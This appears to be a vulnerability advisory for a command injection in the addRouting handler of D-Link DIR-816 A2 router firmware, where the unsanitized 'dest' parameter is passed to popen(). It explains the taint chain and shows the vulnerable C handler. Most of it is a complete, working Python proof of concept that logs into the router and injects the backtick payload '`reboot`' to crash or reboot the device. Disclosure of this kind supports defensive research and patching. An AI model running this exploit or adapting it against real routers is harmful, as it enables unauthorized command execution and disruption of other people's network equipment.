## DIR 816

> bin_vision:DIR-816A2_v1.10CNB03_D77137
> goahead
> goform/addRouting
>
> type: command injection
> string: dest

### description

The `addRouting` handler receives the user-controlled `dest` parameter from the GoAhead web request. The value is read directly via `websGetVar()` with no sanitization. It is interpolated into a `route add` command string via `snprintf()` and passed to `popen()` for shell execution.

Vulnerability chain: `websGetVar("dest")` -> `snprintf("route add -net %s netmask %s gw %s dev %s")` -> `popen(cmd, "r")`.

An authenticated attacker can inject shell metacharacters (e.g. backticks) in the `dest` field to achieve command execution when the static route is added.

### code

#### formAddRouting handler

~~~c
  websFormDefine("addRouting", (int)formAddRouting_handler);
~~~

~~~c
// formAddRouting handler
void formAddRouting(int wp)
{
    char cmd[256];
    char *dest = websGetVar(wp, "dest", "");      // <--- Read user-controlled dest from the request
    char *mask = websGetVar(wp, "mask", "");
    char *gw   = websGetVar(wp, "gateway", "");
    char *iface = websGetVar(wp, "interface", "");

    // No sanitization of dest, mask, gw, or iface
    snprintf(cmd, sizeof(cmd), "route add -net %s netmask %s gw %s dev %s",
             dest, mask, gw, iface);              // <--- Insert dest into route command
    popen(cmd, "r");                               // <--- Execute command with tainted value; command injection triggers here
}
~~~

### PoC

Source: `PoC/CNB03_v1.10/verified/poc_addRouting.py`

```python
"""
D-Link DIR-816 A2 - Command Injection in Static Routing (addRouting)
Firmware: DIR-816A2_v1.10CNB03_D77137
Entry: 000270
Endpoint: /goform/addRouting
Parameter: dest
Sink: popen("route add ... %s ... %s ... %s") - DIRECT
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Command Injection in Static Routing (addRouting)")
    print(f"[*] Endpoint: /goform/addRouting")
    print(f"[*] Parameter: dest")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    payload = "`reboot`"
    data = {"tokenid": tokenid, "dest": payload, "hostnet": "0", "netmask": "255.255.255.0", "gateway": "192.168.1.1", "interface": "WAN"}
    print(f"[*] Sending payload: {payload}")
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/addRouting", data=data, timeout=30)
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f}s")

    # For reboot payload: device responds quickly then goes offline
    print("[*] Waiting 8s to check if device rebooted...")
    time.sleep(8)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code}) — payload did not execute")
    except Exception:
        print("[+] VULNERABLE! Device went offline after payload (rebooted)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```